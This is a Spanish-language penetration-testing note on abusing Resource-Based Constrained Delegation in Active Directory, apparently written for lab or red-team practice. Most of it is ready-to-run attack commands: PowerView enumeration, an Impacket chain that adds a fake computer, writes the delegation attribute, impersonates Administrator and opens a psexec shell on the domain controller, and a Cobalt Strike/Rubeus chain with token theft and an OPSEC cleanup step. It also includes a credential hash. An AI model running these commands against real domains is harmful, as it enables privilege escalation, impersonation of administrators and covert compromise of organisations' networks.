---
tags: [ad, kerberos, rbcd, delegation, impacket, cobalt-strike]
status: completo
---

# Resource-Based Constrained Delegation (RBCD)

> 🔴 Por completar con experiencia de campo.

---

## Concepto

RBCD configura la delegación en el recurso destino (no en el cliente). Si podemos escribir en el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del objeto AD, podemos abusar de S4U2Proxy para impersonar a cualquier usuario.

A diferencia de Constrained Delegation clásica (que requiere `SeEnableDelegationPrivilege` — solo DA/EA), RBCD solo requiere **WriteProperty sobre ese atributo** en el objeto destino. También aplica con **GenericWrite** o **GenericAll** sobre el objeto completo.

---

## Condiciones para el abuso

1. **Write access** sobre `msDS-AllowedToActOnBehalfOfOtherIdentity` de un equipo objetivo
2. **Control de una cuenta con SPN** (cuenta de máquina con SYSTEM, service account kerberoasteada, o crear una con `msDS-MachineAccountQuota` — por defecto 10 por usuario)

---

## Enumeración

```powershell
# GUID de msDS-AllowedToActOnBehalfOfOtherIdentity: 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79

ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
$Cred = Get-Credential CONTOSO\rsteel
Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | `
  Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | `
  ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | `
  select ObjectDN,SecurityIdentifier

# Resolver el SID a nombre
Get-ADGroup -Filter 'objectsid -eq "<SID>"' -Server 10.10.120.1 -Credential $Cred

# Ver qué equipos ya tienen RBCD configurado
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```

---

## Ataque desde Linux (Impacket)

### 1. Crear equipo falso

```bash
# Con hash
impacket-addcomputer RESOURCED.LOCAL/L.LIVINGSTONE -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 -computer-name FAKEPC -computer-pass "Pass123!"

# Con contraseña
addcomputer.py RESOURCED.LOCAL/L.LIVINGSTONE:password -computer-name FAKEPC -computer-pass Pass123!
```

### 2. Configurar RBCD

```bash
rbcd.py RESOURCED.LOCAL/L.LIVINGSTONE:password -action write -delegate-from FAKEPC$ -delegate-to RESOURCEDC$
```

### 3. Obtener ST como Administrator

```bash
impacket-getST RESOURCED.LOCAL/FAKEPC\$:'Pass123!' -spn cifs/RESOURCEDC.RESOURCED.LOCAL -impersonate Administrator
```

### 4. Exportar ticket y acceder

```bash
export KRB5CCNAME=Administrator@cifs_RESOURCEDC.RESOURCED.LOCAL@RESOURCED.LOCAL.ccache
impacket-psexec -k -no-pass RESOURCED.LOCAL/Administrator@RESOURCEDC.RESOURCED.LOCAL
```

> [!tip] Por qué CIFS
> CIFS es el protocolo necesario para SMB/PsExec — permite `impacket-psexec` que usa named pipes a través de SMB.

---

## Ataque desde Windows (Cobalt Strike / Rubeus)

### 1. Añadir nuestro equipo al atributo del target

```powershell
$ws1    = Get-ADComputer -Identity 'lon-ws-1'    -Server 10.10.120.1 -Credential $Cred
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred

Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
```

### 2. Obtener TGT del equipo añadido

```
beacon> execute-assembly Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

### 3. S4U2self + S4U2proxy

```
beacon> execute-assembly Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:<TGT_b64> /nowrap
```

### 4. Usar el ticket

```
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<ST_b64>
beacon> steal_token <PID>
beacon> ls \\lon-fs-1\c$
```

### 5. Limpiar (OPSEC)

```powershell
# Restaurar solo la entrada original
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
```

---

## Referencias

- [HackTricks — RBCD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
- Elad Shamir — Wagging the Dog
- [[05-ad-attacks/kerberos/constrained-delegation|Constrained Delegation]]
- [[05-ad-attacks/kerberos/s4u2self|S4U2Self]]
